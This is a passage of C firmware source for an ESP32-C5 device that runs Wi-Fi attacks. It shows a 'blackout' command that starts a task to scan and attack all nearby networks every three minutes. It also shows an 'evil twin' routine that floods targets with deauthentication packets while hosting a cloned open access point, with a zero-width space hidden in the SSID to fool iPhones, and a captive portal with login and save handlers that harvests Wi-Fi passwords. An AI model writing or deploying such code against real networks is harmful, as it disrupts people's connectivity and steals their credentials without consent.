brokali/projectZeroTouch/ESP32C5/main/main.c
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if blackout attack is already running
    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Blackout attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting blackout attack - scanning all networks every 3 minutes...");
    MY_LOG_INFO(TAG, "Networks will be sorted by channel for efficient attacking.");
    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack.");
    
    // Start blackout attack in background task
    blackout_attack_active = true;
    BaseType_t result = xTaskCreate(
        blackout_attack_task,
        "blackout_task",
        4096,  // Stack size
        NULL,
        5,     // Priority
        &blackout_attack_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create blackout attack task!");
        blackout_attack_active = false;
        return 1;
    }
    
    return 0;
}

static void boot_button_task(void *arg) {
    const TickType_t delay_ticks = pdMS_TO_TICKS(BOOT_BUTTON_POLL_DELAY_MS);
    const TickType_t long_press_ticks = pdMS_TO_TICKS(BOOT_BUTTON_LONG_PRESS_MS);
    bool prev_pressed = (gpio_get_level(BOOT_BUTTON_GPIO) == 0);
    TickType_t press_start_tick = prev_pressed ? xTaskGetTickCount() : 0;
    bool long_action_triggered = false;

    while (1) {
        bool pressed = (gpio_get_level(BOOT_BUTTON_GPIO) == 0);
        TickType_t now = xTaskGetTickCount();

        if (pressed) {
            if (!prev_pressed) {
                // Rising edge - start tracking the press
                press_start_tick = now;
                long_action_triggered = false;
            } else if (!long_action_triggered && (now - press_start_tick) >= long_press_ticks) {
                long_action_triggered = true;
                printf("Boot Long Pressed\n");
                fflush(stdout);
                boot_handle_action(true);
            }
        } else if (prev_pressed) {
            // Falling edge - button released
            if (!long_action_triggered) {
                printf("Boot Pressed\n");
                fflush(stdout);
                boot_handle_action(false);
            }
            long_action_triggered = false;
        }

        prev_pressed = pressed;
        vTaskDelay(delay_ticks);
    }
}

/*
0) Starts captive portal to collect password
1) Starts a stream of deauth packets sent to all target networks. 
2) When password is entered in portal, stops deauth stream and attempts to connect to a network

*/
static int cmd_start_evil_twin(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    if (!onlyDeauth) {
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        oled_display_update_full("> Evil Twin", oled_target, "  Captive portal", "  Waiting pwd..");
    }
    log_memory_info("start_evil_twin");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if attack is already running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    if (g_selected_count > 0) {
        // Set application state based on attack type
        if (onlyDeauth) {
            applicationState = DEAUTH;
        } else {
            applicationState = DEAUTH_EVIL_TWIN;
            // Reset password wrong flag for new attack
            last_password_wrong = false;
        }

        const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
        evilTwinSSID = malloc(strlen(sourceSSID) + 1); 
        if (evilTwinSSID != NULL) {
            strcpy(evilTwinSSID, sourceSSID);
        } else {
            ESP_LOGW(TAG,"Malloc error 4 SSID");
        }

        // Start portal before starting deauth attack
        if (!onlyDeauth) {
            MY_LOG_INFO(TAG,"Starting captive portal for Evil Twin attack on: %s", evilTwinSSID);
            
            // Enable AP mode (switches to APSTA) and get AP netif
            esp_netif_t *ap_netif = ensure_ap_mode();
            if (!ap_netif) {
                MY_LOG_INFO(TAG, "Failed to enable AP mode");
                applicationState = IDLE;
                return 1;
            }
            
            // Stop DHCP server to configure custom IP
            esp_netif_dhcps_stop(ap_netif);
            
            // Set static IP 172.0.0.1 for AP
            esp_netif_ip_info_t ip_info;
            ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
            ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
            ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
            
            esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
            if (ret != ESP_OK) {
                applicationState = IDLE;
                return 1;
            }
            
            // Configure AP with Evil Twin SSID
            wifi_config_t ap_config = {
                .ap = {
                    .ssid = "",
                    .ssid_len = 0,
                    .channel = target_bssid_count > 0 ? target_bssids[0].channel : 1,
                    .password = "",
                    .max_connection = 4,
                    .authmode = WIFI_AUTH_OPEN
                }
            };
            
            // Copy original SSID and add Zero Width Space (U+200B) at the end
            // This prevents iPhone from grouping original and twin networks together
            size_t ssid_len = strlen(evilTwinSSID);
            if (ssid_len + 3 <= sizeof(ap_config.ap.ssid)) {
                // Copy original SSID
                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
                // Add Zero Width Space (UTF-8: 0xE2 0x80 0x8B)
                ap_config.ap.ssid[ssid_len] = 0xE2;
                ap_config.ap.ssid[ssid_len + 1] = 0x80;
                ap_config.ap.ssid[ssid_len + 2] = 0x8B;
                ap_config.ap.ssid_len = ssid_len + 3;
            } else {
                // SSID too long, just copy without Zero Width Space
                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen(evilTwinSSID);
            }
            
            // AP mode was enabled by ensure_ap_mode(), update the configuration
            ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
            if (ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
                applicationState = IDLE;
                return 1;
            }
            
            // Start DHCP server
            ret = esp_netif_dhcps_start(ap_netif);
            if (ret != ESP_OK) {
                applicationState = IDLE;
                return 1;
            }
            
            // Wait a bit for AP to fully start
            vTaskDelay(pdMS_TO_TICKS(1000));
            
            // Configure HTTP server
            httpd_config_t config = HTTPD_DEFAULT_CONFIG();
            config.server_port = 80;
            config.max_open_sockets = 7;
            
            // Start HTTP server
            esp_err_t http_ret = httpd_start(&portal_server, &config);
            if (http_ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
                // Stop DHCP before returning
                esp_netif_dhcps_stop(ap_netif);
                applicationState = IDLE;
                return 1;
            }
            
            // Register URI handlers
            httpd_uri_t root_uri = {
                .uri = "/",
                .method = HTTP_GET,
                .handler = root_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &root_uri);
            
            httpd_uri_t root_post_uri = {
                .uri = "/",
                .method = HTTP_POST,
                .handler = root_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &root_post_uri);
            
            httpd_uri_t portal_uri = {
                .uri = "/portal",
                .method = HTTP_GET,
                .handler = portal_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &portal_uri);
            
            httpd_uri_t login_uri = {
                .uri = "/login",
                .method = HTTP_POST,
                .handler = login_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &login_uri);
            
            httpd_uri_t get_uri = {
                .uri = "/get",
                .method = HTTP_GET,
                .handler = get_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &get_uri);
            
            httpd_uri_t save_uri = {
                .uri = "/save",
                .method = HTTP_POST,
                .handler = save_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &save_uri);
            
